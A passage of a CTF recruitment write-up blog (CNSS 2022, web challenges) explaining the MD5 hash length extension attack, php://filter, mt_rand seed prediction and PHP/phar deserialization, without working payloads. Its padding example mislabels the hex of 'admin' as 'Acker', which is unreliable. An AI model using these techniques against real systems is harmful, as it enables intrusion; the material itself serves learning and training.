+<h4 id="hash加密原理"><a href="#hash加密原理" class="headerlink" title="hash加密原理"></a>hash加密原理</h4><p>我们需要了解以下几点md5加密过程：</p>
+<blockquote>
+<p>MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算</p>
+<p>关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。</p>
+<p>MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量。</p>
+</blockquote>
+<p>举一个例子讲一下如何填充：比如字符串“Acker” 十六进制0x41636b6572这里与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</span><br></pre></td></tr></table></figure>
+
+<p>此处补充：以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4&#x3D;512这就是一组，正好是512bit。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320532282.jpg"></p>
+<p>上图中的8是因为补位时二进制第一位要补1，那么1000转换成16进制就是8.后面都补上0.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320602395.jpg"></p>
+<p>填充数据最后8字节长度，Acker长度为5*8&#x3D;40bit，又因为0x28&#x3D;40所以16进制显示为28.</p>
+<p>为什么数据会在左端：MD5中储存的都是小端方式，比如0x12345678，那么md5存储顺序就是0x78563412</p>
+<h4 id="MD5拓展攻击演示"><a href="#MD5拓展攻击演示" class="headerlink" title="MD5拓展攻击演示"></a><strong>MD5拓展攻击演示</strong></h4><p>下图为加密流程图，可以更直观看清楚整个流程。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/15203320694308.jpg"></p>
+<p>选一个字符串例如“Acker”MD5（“Acker”）&#x3D; dee2fb2df156f4040f893d8a10ac1034</p>
+<p>现在我们不需要知道字符串是什么。只需要知道其长度，并将字符串填充完，新加一个字符串如：addition，之前得到的“Acker”MD5值作为最后一块加密的初始向量，最后得到的结果和MD5（“Acker+addition”）是一样的。</p>
+<h2 id="Mid-Pesudo2"><a href="#Mid-Pesudo2" class="headerlink" title="[Mid] Pesudo2"></a>[Mid] Pesudo2</h2><h4 id="PHP-Filter伪协议"><a href="#PHP-Filter伪协议" class="headerlink" title="PHP Filter伪协议"></a>PHP Filter伪协议</h4><p><code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在<strong>读取和写入</strong>之前对数据进行一些<strong>过滤</strong>，例如<code>base64</code>编码处理，<code>rot13</code>处理等。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602132307452-8926922491.png"></p>
+<p>伪协议小总结：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/1937992-20200602133612437-163441181.png"></p>
+<p>（后面再来细说）</p>
+<h4 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h4><p>mt_srand()函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> mt_srand() 函数播种 Mersenne Twister 随机数生成器。</span><br><span class="line"> 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。</span><br></pre></td></tr></table></figure>
+
+<p>在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点。</p>
+<p>mt_rand()的生成的随机数只跟<strong>seed</strong>和<strong>调用该函数的次数</strong>有关</p>
+<p>只需要知道一个随机数，就可以利用工具反推出可能的种子，知道种子，随机数就不算随机数了。</p>
+<p>本题通过第一个随机数猜测出seed，再算第114514次的，完工。</p>
+<h2 id="Mid-Best-Language"><a href="#Mid-Best-Language" class="headerlink" title="[Mid] Best Language"></a>[Mid] Best Language</h2><h3 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h3><h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><h5 id="为什么反序列化？"><a href="#为什么反序列化？" class="headerlink" title="为什么反序列化？"></a>为什么反序列化？</h5><p><strong>1.存储需求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  “所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。”</span><br><span class="line"> 在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.传输需求</strong></p>
+<p>序列化说通俗点就是<strong>把一个对象变成可以传输的字符串</strong>。举个例子，不知道大家知不知道json格式，这就是一种序列化，有可能就是通过array序列化而来的。而反序列化就是把那串可以传输的字符串再变回对象。</p>
+<p>这样就让对象能够以<strong>字节流</strong>的形式传输。</p>
+<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221022110413532-1024x394.png"></p>
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种<strong>打包文件</strong>。如果你使用的是 PHP 5.3 或更高版本，那么Phar后缀文件是默认开启支持的，你不需要任何其他的安装就可以使用它。</p>
+<p>PHAR文件缺省状态是只读的，使用Phar文件不需要任何的配置。部署非常方便。因为我们现在需要创建一个自己的Phar文件，所以需要允许写入Phar文件，这需要修改一下 <code>php.ini</code></p>
+<p>打开 <code>php.ini</code>，找到 <code>phar.readonly</code> 指令行，修改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> phar.readonly = 0</span><br></pre></td></tr></table></figure>
+
+<p>现在，我们就可以来把PHP应用打包成Phar文件了。</p>
+<p>——————————————————————————————————————————</p>
+<p>PHAR文件是一种<strong>打包格式</strong>，通过将多数PHP文件和其他资源（如图像）捆绑到一个归档文件中来实现应用程序和库的分发。且所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的php代码。</p>
+<p>PHAR存档最有特色的一种方便的方法是将多个文件分组为一个文件。这样，PHAR存档提供了一种<strong>将完整的php应用程序分发到单个文件中并从该文件运行</strong>它的方法，而无需将其提取到磁盘。</p>
+<p>PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行PHAR存档。</p>
+<h4 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h4><p><strong>PHAR:&#x2F;&#x2F;协议</strong></p>
+<p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
+<p><strong>利用函数</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20200415221922550.png"></p>
+<p><strong>姿势1:绕过上传限制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 1.使用Phar://伪协议流可以绕过一些上传限制，大多数情况下和文件包含一起使用</span><br></pre></td></tr></table></figure>
+
+<h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p><strong>姿势2:[反序列化]漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> # 漏洞触发</span><br><span class="line"> 利用Phar:// 伪协议读取phar文件时</span><br><span class="line"> 会反序列化meta-data储存信息</span><br></pre></td></tr></table></figure>
+
+<p>meta-data是以序列化的形式存储的。 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hard-Walk-Through-My-Intranet-1"><span class="toc-number">1.</span> <span class="toc-text">[Hard] Walk Through My Intranet - 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">1.1.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">linux敏感目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">linux常见命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bip%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">查看ip等信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">1.3.0.3.</span> <span class="toc-text">显示当前位置路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#find"><span class="toc-number">1.3.0.4.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%88-%EF%BC%89"><span class="toc-number">1.3.0.5.</span> <span class="toc-text">系统信息（*）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh"><span class="toc-number">1.4.</span> <span class="toc-text">ssh</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">公钥登录</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#5-%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.2.0.1.</span> <span class="toc-text">5.远程登录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.5.0.0.1.</span> <span class="toc-text">netcat反弹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.5.0.0.2.</span> <span class="toc-text">利用Bash反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Proxy"><span class="toc-number">2.</span> <span class="toc-text">[Mid] CNSS Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-directory"><span class="toc-number">2.1.</span> <span class="toc-text">proc directory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">各种目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">注意：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">2.2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">2.2.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.2.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98"><span class="toc-number">2.2.4.</span> <span class="toc-text">这个题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pycdc%EF%BC%88re%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">pycdc（re）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cython"><span class="toc-number">2.4.</span> <span class="toc-text">cython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E6%A1%86%E6%9E%B6"><span class="toc-number">2.5.</span> <span class="toc-text">flask框架</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-CNSS-Database"><span class="toc-number">3.</span> <span class="toc-text">[Mid] CNSS Database</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Prepared-Statement"><span class="toc-number">3.0.1.</span> <span class="toc-text">Prepared Statement</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">预编译语句</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.0.2.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pdo%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">3.0.3.</span> <span class="toc-text">pdo预处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-ezpad"><span class="toc-number">4.</span> <span class="toc-text">[Mid] ezpad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4"><span class="toc-number">4.1.</span> <span class="toc-text">脚本爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">intval绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">hash长度扩展攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hash%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-number">4.3.1.</span> <span class="toc-text">hash加密原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MD5%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="toc-number">4.3.2.</span> <span class="toc-text">MD5拓展攻击演示</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Pesudo2"><span class="toc-number">5.</span> <span class="toc-text">[Mid] Pesudo2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-Filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.0.1.</span> <span class="toc-text">PHP Filter伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">5.0.2.</span> <span class="toc-text">伪随机数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mid-Best-Language"><span class="toc-number">6.</span> <span class="toc-text">[Mid] Best Language</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">6.1.</span> <span class="toc-text">PHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">为什么反序列化？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">魔术方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar"><span class="toc-number">6.2.</span> <span class="toc-text">phar</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.2.1.</span> <span class="toc-text">phar伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.2.2.</span> <span class="toc-text">phar反序列化</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&text=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&is_video=false&description=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CNSS 2022 招新writeup(web)部分题目&body=Check out this article: http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&title=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&name=CNSS 2022 招新writeup(web)部分题目&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/&t=CNSS 2022 招新writeup(web)部分题目"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
